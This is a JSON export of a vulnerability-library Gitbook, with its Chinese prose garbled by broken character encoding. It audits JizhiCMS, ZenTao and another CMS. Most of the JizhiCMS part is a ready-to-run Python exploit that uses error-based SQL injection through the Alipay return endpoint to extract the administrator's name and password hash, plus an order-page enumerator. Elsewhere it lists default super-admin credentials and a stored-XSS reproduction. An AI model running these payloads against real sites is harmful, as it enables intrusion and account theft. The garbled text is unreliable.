Ê†áËÆ∞Âπ∂ËΩ¨Êç¢‰∏∫ HTML ÂÆû‰Ωì } else { SafeFilter($arr[$key]); } } } } Áúã‰∏Ä‰∏ãÊâßË°åÁöÑSQLËØ≠Âè•ÁöÑÂáΩÊï∞ // Êü•ËØ¢‰∏ÄÊù° public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } Ë∑üËøõ findAll ÂáΩÊï∞ // Êü•ËØ¢ÊâÄÊúâ public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } Âú®Ë∑üËøõ‰∏Ä‰∏ãgetDataÂáΩÊï∞ //Ëé∑ÂèñÊï∞ÊçÆ public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } Ë∑üËøõqueryÊâßË°åÂáΩÊï∞ //ÊâßË°åSQLËØ≠Âè•Âπ∂Ê£ÄÊü•ÊòØÂê¶ÈîôËØØ public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('Êï∞ÊçÆÂ∫ìÈîôËØØÔºö' . $msg[2] . end($this->filter)); } } ÁúãÂà∞$msg = $this->pdo->errorInfo();ËØ≠Âè•Ôºå‰πüÂ∞±ÊòØËØ¥‰ºöÊääÊï∞ÊçÆÂ∫ìÊä•Èîô‰ø°ÊÅØÊâìÂç∞Âú®È°µÈù¢‰∏äÂπ∂ÊòæÁ§∫Âá∫Êù•Âπ∂ÈÄÄÂá∫ ‰∏ÄÂ•óÂàÜÊûê‰∏ãÊù•Ê≤°ÊúâÂèëÁé∞ÂØπsqlËØ≠Âè•ÁöÑËøáÊª§ÔºåÂ¶ÇÊûúÂæóÂà∞ÁöÑÊï∞ÊçÆÊ≤°ÊúâÁªèËøáformat_paramËøáÊª§Ôºå‰ºö‰∫ßÁîüÊ≥®ÂÖ• ‰æãÂ¶Ç: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } Â¶ÇÊûúÁõ¥Êé•ËøôÊ†∑GET POST REQUEST Â∏¶ÂÖ•Êï∞ÊçÆÂ∫ì ‰ºö‰∫ßÁîüÊä•ÈîôÊ≥®ÂÖ• ‰æãÂ¶Ç ./exploit/name=123' (Âä†‰∏Ä‰∏™ÂºïÂè∑‰ºöÊä•ÈîôÔºåÂ¶ÇÊûúÂºïÂè∑Ê≤°ËøáÊª§) Áé∞Âú®Âè™ÈúÄË¶ÅÂØªÊâæÁ±ªÂûãÊòØËøôÊ†∑Ê≤°ËøáÊª§Áõ¥Êé•Â∏¶ÂÖ•Êï∞ÊçÆÂ∫ìÁöÑËØ≠Âè•Â∞±Ë°å‰∫Ü ÁÆÄÂçïÂØªÊâæ‰∏ãÂÖ∂ÂÆûËøôÊ†∑ÁöÑÂú∞ÊñπÊå∫Â§öÁöÑÔºåÊãø‰∏Ä‰∏™‰ΩçÁΩÆ‰∏æ‰æãÂ≠ê ËøôÈáåÊòØ‰∏Ä‰∏™ÊîØ‰ªòÊèí‰ª∂ÁöÑ‰ΩçÁΩÆÔºåËìùËâ≤ÊñπÂùó1Â¢ûÂä†‰ª£Á†ÅÊ®°ÊãüÂºÄÈÄöÊîØ‰ªòÂÆùÂäüËÉΩÈÄöËøáÈ™åËØÅ ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™ÂáΩÊï∞Âè™‰ΩøÁî®[htmlspecialchars]Êù•ËøáÊª§‰∫ÜxssÔºåsqlËØ≠Âè•Ê≤°ÊúâËøáÊª§ÔºåÁî®ÂàöÂàöÁöÑÊñπÊ≥ïÊù•Ê≥®ÂÖ• ÂèØ‰ª•ÁúãÂà∞ÁöÑÁ°ÆÂá∫Áé∞‰∫ÜsqlËØ≠Âè•ÂíåÊï∞ÊçÆÂ∫ìÈîôËØØ Áõ¥Êé•Êä•ÈîôÊ≥®ÂÖ•Ëé∑ÂèñÊïèÊÑü‰ø°ÊÅØmypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" ÂÆòÁΩëurl : https://www.jizhicms.cn/ \"\"\" def main(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÊûÅËá¥CMS 1.67 - 171 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 CNVD-2020-49710.py \\033[0m') print('+------------------------------------------') while True: poc = str(input('ÈÄâÊã©‰ΩøÁî®ÁöÑpocÔºö\\n' '1.sqlÊ≥®ÂÖ•\\n' '2.Áî®Êà∑Ë¥≠Áâ©ËΩ¶ÁàÜÁ†¥\\n' '3.GET ÁΩëÁ´ôÁÆ°ÁêÜÂëòË¥¶Âè∑ÂØÜÁ†Å\\n' '4.ÈÄÄÂá∫ quit\\n' 'poc:')) print('------------------ peiqi -----------------------') if poc == '1': poc_1() elif poc == '2': poc_2() elif poc == '3': poc_3() elif poc == '4': break else: print('ÂèÇÊï∞ÈîôËØØÔºåÈáçÊñ∞ËæìÂÖ•') def poc_1(): ## poc_1 ---> sqlÊ≥®ÂÖ•ÊºèÊ¥ûÁÇπ( Home/c/MypayController.php [alipay_notify_pay]) ## ‰ΩøÁî®ËåÉÂõ¥ ÊûÅËá¥cms 1.71 + 1.7 + 1.67 ÁâàÊú¨ \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //ÊîØ‰ªòÂÆùÂÖ¨Èí•ÔºåË¥¶Êà∑‰∏≠ÂøÉ->ÂØÜÈí•ÁÆ°ÁêÜ->ÂºÄÊîæÂπ≥Âè∞ÂØÜÈí•ÔºåÊâæÂà∞Ê∑ªÂä†‰∫ÜÊîØ‰ªòÂäüËÉΩÁöÑÂ∫îÁî®ÔºåÊ†πÊçÆ‰Ω†ÁöÑÂä†ÂØÜÁ±ªÂûãÔºåÊü•ÁúãÊîØ‰ªòÂÆùÂÖ¨Èí• $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //È™åËØÅÁ≠æÂêç $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; ‰ªòÊ¨æÊàêÂäü'; $out_trade_no = htmlspecialchars($_GET['out_trade_no']); find(['orderno'=>$orderno]); ÂèëÂ∏ÉÊó∂Èó¥ 2020-05-25]') else: print('ÂæóÂà∞ÁöÑÊï∞ÊçÆ‰∏∫:\\n', data) print('------------------ peiqi -----------------------') except: print('Âá∫Áé∞ÈîôËØØ') print('------------------ peiqi -----------------------') # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2(): ## poc_2 ---> Áî®Êà∑Ë¥≠Áâ©ËΩ¶È°µÈù¢Ëé∑Âèñ (Home/c/UserController.php [orderdetails]) ## ÊºèÊ¥ûÁÇπ ---> Êó†Áî®Êà∑cookie id ÁöÑÈ™åËØÅ ## ‰ΩøÁî®ËåÉÂõ¥ ÊûÅËá¥cms 1.8‰ª•‰∏ãÂÖ®ÁâàÊú¨ (ÂΩìÂâçÊúÄÊñ∞ v1.8 Êõ¥Êñ∞Êó∂Èó¥:6Êúà30Êó•) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //Ë∂ÖÊó∂ÊàñËÄÖÂ∑≤ÊîØ‰ªò if($order['isshow']==0){ $msg = 'ËÆ¢ÂçïÂ∑≤Âà†Èô§'; } if($order['isshow']==3){ $msg = 'ËÆ¢ÂçïÂ∑≤ËøáÊúüÔºå‰∏çÂèØÊîØ‰ªòÔºÅ'; } if($order['isshow']==2){ $msg = 'ËÆ¢ÂçïÂ∑≤ÊîØ‰ªòÔºåËØ∑ÂãøÈáçÂ§çÊìç‰ΩúÔºÅ'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //ÂÖºÂÆπÂ§öÊ®°ÂùóÂåñ if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try: exploit_url = str(input(\"ÊîªÂáªÁΩëÁ´ôurlÔºö\\n\")) year_day = str(input(\"ËæìÂÖ•Êó•Êúü(‰æãÂ¶Ç:20200712):\")) shop = [] # ÈÅçÂéÜÊâÄÊúâÂá∫Áé∞ÁöÑÁî®Êà∑Ë¥≠Áâ©ËΩ¶È°µÈù¢ for num in range(100000,999999): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests.get(exploit_url + payload_url) # ÊâìÂç∞ÁªìÊûú if 'ÊÄªÈáëÈ¢ù' in response.text: print('Ë¥≠Áâ©ËΩ¶È°µÈù¢Ôºö',payload_url) shop.append(payload_url) for page in shop: print(page) print('------------------ peiqi -----------------------') except: print('Âá∫Áé∞ÈîôËØØ') print('------------------ peiqi -----------------------') def poc_3(): ## poc_3 ---> ÂæóÂà∞Ë¥¶Âè∑ÂØÜÁ†Å ( Home/c/MypayController.php [alipay_notify_pay]) ## ‰ΩøÁî®ËåÉÂõ¥ ---> ÊûÅËá¥cms 1.71 + 1.7 + 1.67 ÁâàÊú¨ try: exploit_url = str(input(\"ÊîªÂáªÁΩëÁ´ôurlÔºö\\n\")) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # Áî®Êà∑Âêç + ÂØÜÁ†Å ÈïøÂ∫¶ payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) str_long = re.search(r'~(.*?)~',response.text).group(1) #print(str_long) # ÂæóÂà∞Ë¥¶Âè∑ÂØÜÁ†ÅÔºåÂØÜÁ†Åmd5Ê†ºÂºè payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_1 = re.search(r\"~#(.*?)'\", response.text).group(1) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str(int(str_long) - 32) +\") from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_2 = re.search(r'~(.*?)~', response.text).group(1) #print(admin_name_2) # ÂàÜÂâ≤Ë¥¶Âè∑ÂØÜÁ†Å admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd.split(':') admin = admin_passwd[0] passwd = admin_passwd[1] #print(admin) #print(passwd) print(\"ÊàêÂäüÂæóÂà∞Ë¥¶Âè∑ÂØÜÁ†ÅÔºö\\n\" \"Áî®Êà∑Âêç:\",admin, \"\\nÂØÜÁ†Å(md5):\",passwd) print('------------------ peiqi -----------------------') except: print('Âá∫Áé∞ÈîôËØØ') print('------------------ peiqi -----------------------') if __name__ == '__main__': main() Ë¥≠Áâ©ËΩ¶ÁàÜÁ†¥Ê≤°ÊúâÂà©Áî®ÁÇπÔºåÂÖ≥‰∫éÂÆ°ËÆ°ÈÉ®ÂàÜÂèÇËÄÉÊûÅËá¥CMSÂÆ°ËÆ° Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÊûÅËá¥CMS/ÊûÅËá¥CMS 1.81‰ª•‰∏ãÁâàÊú¨ Â≠òÂÇ®ÂûãXSS.html":{"url":"book/CMSÊºèÊ¥û/ÊûÅËá¥CMS/ÊûÅËá¥CMS 1.81‰ª•‰∏ãÁâàÊú¨ Â≠òÂÇ®ÂûãXSS.html","title":"ÊûÅËá¥CMS <1.81 ÁâàÊú¨ Â≠òÂÇ®ÂûãXSS","keywords":"","body":"ÊûÅËá¥CMS 1.81‰ª•‰∏ãÁâàÊú¨ Â≠òÂÇ®ÂûãXSS ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÁÆ°ÁêÜÂëòÊ∑ªÂä†Ê®°Âùó Ê≥®ÂÜåÁî®Êà∑ ÁÇπÂáªÂèëÂ∏ÉÊñáÁ´† Âú®ÊñáÁ´†Ê†áÈ¢òÂ§ÑÊèíÂÖ•xss payload ÂΩìÁÆ°ÁêÜÂëòËÆøÈóÆÊó∂XSSÊàêÂäü ÂèÇËÄÉ ÊûÅËá¥CMS‰ª£Á†ÅÂÆ°ËÆ° Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÂçéÂÆú‰∫íËÅîCMS/":{"url":"book/CMSÊºèÊ¥û/ÂçéÂÆú‰∫íËÅîCMS/","title":"ÂçéÂÆú‰∫íËÅîCMS","keywords":"","body":"ÂçéÂÆú‰∫íËÅîCMS ÂçéÂÆú‰∫íËÅîCMSÈªòËÆ§Â≠òÂú®Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÂçéÂÆú‰∫íËÅîCMS/ÂçéÂÆú‰∫íËÅîCMSÈªòËÆ§Â≠òÂú®Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/ÂçéÂÆú‰∫íËÅîCMS/ÂçéÂÆú‰∫íËÅîCMSÈªòËÆ§Â≠òÂú®Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÊºèÊ¥û.html","title":"ÂçéÂÆú‰∫íËÅîCMSÈªòËÆ§Â≠òÂú®Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÊºèÊ¥û","keywords":"","body":"ÂçéÂÆú‰∫íËÅîCMSÈªòËÆ§Â≠òÂú®Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂçéÂÆú‰∫íËÅîCMSÈªòËÆ§Â≠òÂú®Ë∂ÖÁ∫ßÁÆ°ÁêÜÂëòÊºèÊ¥ûÔºåÂ¶Ç‰∏ç‰øÆÊîπÂàô‰ΩøÁî®ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†ÅÂç≥ÂèØÁôªÂΩïË∂ÖÁ∫ßÁÆ°ÁêÜÂëò ÂΩ±ÂìçÁâàÊú¨ ÂçéÂÆú‰∫íËÅîCMS FOFA [!NOTE] body=\"ÂçéÂÆúÁΩëÁªú\" ÊºèÊ¥ûÂ§çÁé∞ ÂéüÁâàÁöÑÊ∫êÁ†ÅÈúÄË¶Å‰ªòË¥πÔºåÂèØÊâæÂà∞ÂÖçË¥πÁâàÁöÑÊ∫êÁ†Å Âú®ÁõÆÂΩï‰∏ãÁöÑDATAÁõÆÂΩï‰∏≠ÊúâmdbÊñá‰ª∂, ÊâìÂºÄÂêéÂèØ‰ª•ÂèëÁé∞Â≠òÂú®ÈªòËÆ§ÁöÑ‰∏§‰∏™Áî®Êà∑ [!NOTE] admin/123456 lu123/cui123 ‰ΩøÁî® Áî®Êà∑lu123 Âç≥ÂèØÁôªÂΩïË∂ÖÁ∫ßÁÆ°ÁêÜÂëò ÂèÇËÄÉÊñáÁ´† ÂçéÂÆú‰∫íËÅî0dayÂàÜ‰∫´ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/":{"url":"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/","title":"Á¶ÖÈÅì","keywords":"","body":"Á¶ÖÈÅì Á¶ÖÈÅì 11.6ÁâàÊú¨ SQLÊ≥®ÂÖ•ÊºèÊ¥û Á¶ÖÈÅì 11.6ÁâàÊú¨ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û Á¶ÖÈÅì Â∞è‰∫é12.4.2 Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û CNVD-C-2020-121325 Á¶ÖÈÅì Â∞è‰∫é12.4.2 CSRFÊºèÊ¥û CNVD-2020-68552 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/Á¶ÖÈÅì 11.6ÁâàÊú¨ SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/Á¶ÖÈÅì 11.6ÁâàÊú¨ SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Á¶ÖÈÅì 11.6ÁâàÊú¨ SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"Á¶ÖÈÅì 11.6ÁâàÊú¨ SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Á¶ÖÈÅì 11.6 ÁâàÊú¨‰∏≠ÂØπÁî®Êà∑Êé•Âè£Ë∞ÉÁî®ÊùÉÈôêËøáÊª§‰∏çÂÆåÂñÑÔºåÂØºËá¥Ë∞ÉÁî®Êé•Âè£ÊâßË°åSQLËØ≠Âè•ÂØºËá¥SQLÊ≥®ÂÖ• ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Á¶ÖÈÅì 11.6 ÁéØÂ¢ÉÊê≠Âª∫ ËøôÈáå‰ΩøÁî®dockerÁéØÂ¢ÉÊê≠Âª∫ docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8084 ÊåâÊ≠•È™§ÂÆâË£ÖÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ÂÖàÂØπÁ¶ÖÈÅìÁöÑË∞ÉÁî®ÊµÅÁ®ãËøõË°åÂàÜÊûê,ÂÖàÊü•ÁúãÁõÆÂΩï‰∏∫www/index.phpÈ¶ñÈ°µÊñá‰ª∂‰∏≠ ËøôÈáå‰ΩøÁî®router::createAppÂàõÂª∫‰∫Ü‰∏Ä‰∏™APPÂØπË±° $app = router::createApp('pms', dirname(dirname(__FILE__)), 'router'); Êù•Âà∞framework/base/router.class.phpÊñá‰ª∂Êü•ÁúãÂà∞createAppÊñπÊ≥ï public static function createApp($appName = 'demo', $appRoot = '', $className = '') { if(empty($className)) $className = __CLASS__; return new $className($appName, $appRoot); } ËøôÈáåNew‰∫Ü‰∏Ä‰∏™ÂØπË±°ÔºåÊü•Áúã‰∏Ä‰∏ãË∞ÉÁî®ÊñπÊ≥ï(348Ë°å) Âú®358Ë°åÂ§ÑË∞ÉÁî®‰∫ÜsetConfigRootÊñπÊ≥ï $this->setConfigRoot(); public function setConfigRoot() { $this->configRoot = $this->basePath . 'config' . DS; } Âú®363Ë°åÂ§ÑË∞ÉÁî®‰∫ÜloadMainConfigÊñπÊ≥ï $this->loadMainConfig(); public function loadMainConfig() { /* ÂàùÂßãÂåñ$configÂØπË±°„ÄÇInit the $config object. */ global $config, $filter; if(!is_object($config)) $config = new config(); $this->config = $config; /* Âä†ËΩΩ‰∏ªÈÖçÁΩÆÊñá‰ª∂„ÄÇ Load the main config file. */ $mainConfigFile = $this->configRoot . 'config.php'; if(!file_exists($mainConfigFile)) $this->triggerError(\"The main config file $mainConfigFile not found\", __FILE__, __LINE__, $exit = true); include $mainConfigFile; } ËøôÈáåÂåÖÂê´‰∫ÜÈÖçÁΩÆÊñá‰ª∂config.phpÈÖçÁΩÆÊñá‰ª∂ÔºåÊñá‰ª∂ÁõÆÂΩï‰∏∫/config/config.php Âú®25Ë°åÂÆö‰πâ‰∫ÜË∞ÉÁî®ÊñπÊ≥ï $config->requestType = 'PATH_INFO'; // ËØ∑Ê±ÇÁ±ªÂûãÔºöPATH_INFO|PATHINFO2|GET„ÄÇ The request type: PATH_INFO|PATH_INFO2|GET. $config->requestFix = '-'; // PATH_INFOÂíåPATH_INFO2Ê®°ÂºèÁöÑÂàÜÈöîÁ¨¶„ÄÇ The divider in the url when PATH_INFO|PATH_INFO2. $config->moduleVar = 'm'; // ËØ∑Ê±ÇÁ±ªÂûã‰∏∫GETÔºöÊ®°ÂùóÂèòÈáèÂêç„ÄÇ requestType=GET: the module var name. $config->methodVar = 'f'; // ËØ∑Ê±ÇÁ±ªÂûã‰∏∫GETÔºöÊ®°ÂùóÂèòÈáèÂêç„ÄÇ requestType=GET: the method var name. $config->viewVar = 't'; // ËØ∑Ê±ÇÁ±ªÂûã‰∏∫GETÔºöËßÜÂõæÂèòÈáèÂêç„ÄÇ requestType=GET: the view var name. $config->sessionVar = 'zentaosid'; // ËØ∑Ê±ÇÁ±ªÂûã‰∏∫GETÔºösessionÂèòÈáèÂêç„ÄÇ requestType=GET: the session var name. $config->views = ',html,json,mhtml,xhtml,'; // ÊîØÊåÅÁöÑËßÜÂõæÁ±ªÂûã„ÄÇ Supported view formats. ÂèØ‰ª•ÂèëÁé∞ËøôÈáåÂ≠òÂú®‰∏§ÁßçË∑ØÁî±PATH_INFO|PATH_INFO2Ôºö‰∏ÄÁßçÊòØm„ÄÅf„ÄÅtÊù•ËøõË°åË∞ÉÁî®„ÄÇÂè¶Â§ñ‰∏ÄÁßçÊòØÈÄöËøá-Êù•ËøõË°åË∞ÉÁî® Âú®index.php‰∏≠ÁöÑ66Ë°å $app->parseRequest(); public function parseRequest() { if($this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2') { $this->parsePathInfo(); $this->setRouteByPathInfo(); } elseif($this->config->requestType == 'GET') { $this->parseGET(); $this->setRouteByGET(); } else { $this->triggerError(\"The request type {$this->config->requestType} not supported\", __FILE__, __LINE__, $exit = true); } } ÁúãÂà∞Ëøô‰∏ÄÊù°ÂàôÊòØÂà§Êñ≠Âäõ‰∏§ÁßçË∞ÉÁî®ÊñπÊ≥ï $this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2' Ë∑üËøõsetRouteByPathInfoÊñπÊ≥ï public function setRouteByPathInfo() { if(!empty($this->URI)) { /* * Ê†πÊçÆ$requestFixÂàÜÂâ≤Á¨¶ÔºåÂàÜÂâ≤ÁΩëÂùÄ„ÄÇ * There's the request seperator, split the URI by it. **/ if(strpos($this->URI, $this->config->requestFix) !== false) { $items = explode($this->config->requestFix, $this->URI); $this->setModuleName($items[0]); $this->setMethodName($items[1]); } /* * Â¶ÇÊûúÁΩëÂùÄ‰∏≠Ê≤°ÊúâÂàÜÈöîÁ¨¶Ôºå‰ΩøÁî®ÈªòËÆ§ÁöÑÊñπÊ≥ï„ÄÇ * No reqeust seperator, use the default method name. **/ else { $this->setModuleName($this->URI); $this->setMethodName($this->config->default->method); } } else { $this->setModuleName($this->config->default->module); // ‰ΩøÁî®ÈªòËÆ§Ê®°Âùó use the default module. $this->setMethodName($this->config->default->method); // ‰ΩøÁî®ÈªòËÆ§ÊñπÊ≥ï use the default method. } $this->setControlFile(); } ÊâÄ‰ª•ÂèØ‰ª•Êé®Êñ≠Âá∫Ë∞ÉÁî®ÁöÑÊñπÊ≥ï ‰æãÂ¶ÇÁôªÂΩïÈ°µÈù¢Êúâ‰∏§ÁßçËÆøÈóÆÊñπÊ≥ï http://xxx.xxx.xxx.xxx/index.php?m=user&f=login http://xxx.xxx.xxx.xxx/user-login.html ÂÜçÁúã‰∏Ä‰∏ãcheckPrivÊñπÊ≥ï public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } ËøôÈáåÊ£ÄÊµã‰∫ÜË∞ÉÁî®Ê®°ÂùóÂíåÊñπÊ≥ïÁöÑÊùÉÈôêÔºåÂèØ‰ª•Áü•ÈÅìÈô§‰∫ÜisOpenMethod‰∏≠ÂÆö‰πâÁöÑÂÖ¨ÂºÄÊ®°ÂùóÂíåÊñπÊ≥ï‰πãÂ§ñÔºåÂÖ∂‰ªñÁöÑÊñπÊ≥ïÈÉΩÊòØÈúÄË¶ÅÁôªÂΩïÁöÑ ÊúÄÂêéÊòØ$app->loadModule();ËøôÊÆµ‰ª£Á†Å public function loadModule() { $appName = $this->appName; $moduleName = $this->moduleName; $methodName = $this->methodName; /* * ÂºïÂÖ•ËØ•Ê®°ÂùóÁöÑcontrolÊñá‰ª∂„ÄÇ * Include the control file of the module. **/ $file2Included = $this->setActionExtFile() ? $this->extActionFile : $this->controlFile; chdir(dirname($file2Included)); helper::import($file2Included); /* * ËÆæÁΩÆcontrolÁöÑÁ±ªÂêç„ÄÇ * Set the class name of the control. **/ $className = class_exists(\"my$moduleName\") ? \"my$moduleName\" : $moduleName; if(!class_exists($className)) $this->triggerError(\"the control $className not found\", __FILE__, __LINE__, $exit = true); /* * ÂàõÂª∫controlÁ±ªÁöÑÂÆû‰æã„ÄÇ * Create a instance of the control. **/ $module = new $className(); if(!method_exists($module, $methodName)) $this->triggerError(\"the module $moduleName has no $methodName method\", __FILE__, __LINE__, $exit = true); $this->control = $module; /* include default value for module*/ $defaultValueFiles = glob($this->getTmpRoot() . \"defaultvalue/*.php\"); if($defaultValueFiles) foreach($defaultValueFiles as $file) include $file; /* * ‰ΩøÁî®ÂèçÂ∞ÑÊú∫Âà∂Ëé∑ÂèñÂáΩÊï∞ÂèÇÊï∞ÁöÑÈªòËÆ§ÂÄº„ÄÇ * Get the default settings of the method to be called using the reflecting. * * */ $defaultParams = array(); $methodReflect = new reflectionMethod($className, $methodName); foreach($methodReflect->getParameters() as $param) { $name = $param->getName(); $default = '_NOT_SET'; if(isset($paramDefaultValue[$appName][$className][$methodName][$name])) { $default = $paramDefaultValue[$appName][$className][$methodName][$name]; } elseif(isset($paramDefaultValue[$className][$methodName][$name])) { $default = $paramDefaultValue[$className][$methodName][$name]; } elseif($param->isDefaultValueAvailable()) { $default = $param->getDefaultValue(); } $defaultParams[$name] = $default; } /** * Ê†πÊçÆPATH_INFOÊàñËÄÖGETÊñπÂºèËÆæÁΩÆËØ∑Ê±ÇÁöÑÂèÇÊï∞„ÄÇ * Set params according PATH_INFO or GET. */ if($this->config->requestType != 'GET') { $this->setParamsByPathInfo($defaultParams); } else { $this->setParamsByGET($defaultParams); } if($this->config->framework->filterParam == 2) { $_GET = validater::filterParam($_GET, 'get'); $_COOKIE = validater::filterParam($_COOKIE, 'cookie'); } /* Ë∞ÉÁî®ËØ•ÊñπÊ≥ï Call the method. */ call_user_func_array(array($module, $methodName), $this->params); return $module; } 